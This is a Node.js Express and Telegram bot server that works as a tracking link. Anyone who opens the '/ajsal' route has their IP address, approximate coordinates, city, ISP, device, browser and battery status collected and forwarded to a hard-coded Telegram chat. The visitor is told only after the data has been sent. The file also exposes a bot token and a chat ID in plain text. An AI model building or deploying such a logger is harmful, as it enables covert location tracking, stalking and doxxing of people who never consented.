const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');
const express = require('express');

// Bot token
const token = "7388778092:AAEo4Nhm5LM-cc3fvxPCb6ifyNzH1KUz9KE";

// Create a bot instance
const bot = new TelegramBot(token, { polling: true });

// Define Telegram ID for user to send messages
const ajsal = '6524787237';

// Create an express app
const app = express();

// Helper Functions
function getDeviceName(userAgent) {
  const ua = userAgent.toLowerCase();

  if (ua.includes('mobile') || ua.includes('android')) {
    return 'Mobile';
  } else if (ua.includes('ipad') || ua.includes('tablet')) {
    return 'Tablet';
  } else if (ua.includes('macintosh') || ua.includes('windows')) {
    return 'Desktop';
  } else {
    return 'Unknown';
  }
}

function getOSVersion(userAgent) {
  const osVersion = (userAgent.match(/(iPhone|iPad|iPod|Android|Windows|Macintosh)\s([0-9._]+)/) || [])[2];
  return osVersion || "Unknown";
}

function getBrowserVersion(userAgent) {
  const regex = /(?:MSIE|Edge|Opera|Firefox|Chrome|Safari)[\/\s](\d+\.\d+)/;
  const match = userAgent.match(regex);
  return match ? match[1] : "unknown";
}

// Function to fetch user data from ipapi.co
async function fetchUserData(ip) {
  try {
    const response = await axios.get(`https://ipapi.co/${ip}/json/`);
    return response.data;
  } catch (error) {
    console.error('Error fetching IP API data:', error.message);
    return null;
  }
}

// Combined Route `/ajsal`
app.get('/ajsal', async (req, res) => {
  const userAgent = req.headers['user-agent'];
  const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  // Get device info
  const deviceName = getDeviceName(userAgent);
  const osVersion = getOSVersion(userAgent);
  const browserVersion = getBrowserVersion(userAgent);

  // Fetch user location data
  const userData = await fetchUserData(userIp);

  // Combine all information into one message
  const message = `
🌐 *Device Info*:
- Device: ${deviceName}
- OS Version: ${osVersion}
- Browser: ${browserVersion}

📍 *Location Info*:
- **IP Address**: ${userData?.ip || "Unknown"}
- **City**: ${userData?.city || "Unknown"}
- **Region**: ${userData?.region || "Unknown"}
- **Country**: ${userData?.country_name || "Unknown"}
- **Latitude**: ${userData?.latitude || "Unknown"}
- **Longitude**: ${userData?.longitude || "Unknown"}
- **ISP**: ${userData?.org || "Unknown"}
`;

  // Send the information to Telegram
  bot.sendMessage(ajsal, message, { parse_mode: 'Markdown' });

  // Respond with an HTML page
  const html = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Device & Location Info</title>
    </head>
    <body>
      <h1>Device & Location Info Sent!</h1>
      <p>Your device and location information have been sent to Telegram.</p>
      <script>
        async function sendBatteryInfo() {
          try {
            const battery = await navigator.getBattery();
            const batteryInfo = {
              level: (battery.level * 100) + '%',
              charging: battery.charging ? 'Charging' : 'Not Charging'
            };
            
            // Send battery info to the server
            fetch('/battery', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(batteryInfo)
            });
          } catch (error) {
            console.error('Failed to get battery info:', error);
          }
        }

        sendBatteryInfo();
      </script>
    </body>
    </html>
  `;

  res.send(html);
});

// Handle battery info sent from the client
app.post('/battery', express.json(), (req, res) => {
  const { level, charging } = req.body;
  const nmessage = `👨🏻‍💻 Navgitor.UserAgent Info 
 
 🔋 *Battery Info*:
- Level: ${level}
- Status: ${charging}`;

  // Send battery info to your Telegram
  bot.sendMessage(ajsal, nmessage, { parse_mode: 'Markdown' });
  
  res.status(200).send('Battery info sent to Telegram.');
});

// Start the server
app.listen(process.env.PORT || 3000, () => {
  console.log(`Server is running on port ${process.env.PORT || 3000}`);
});
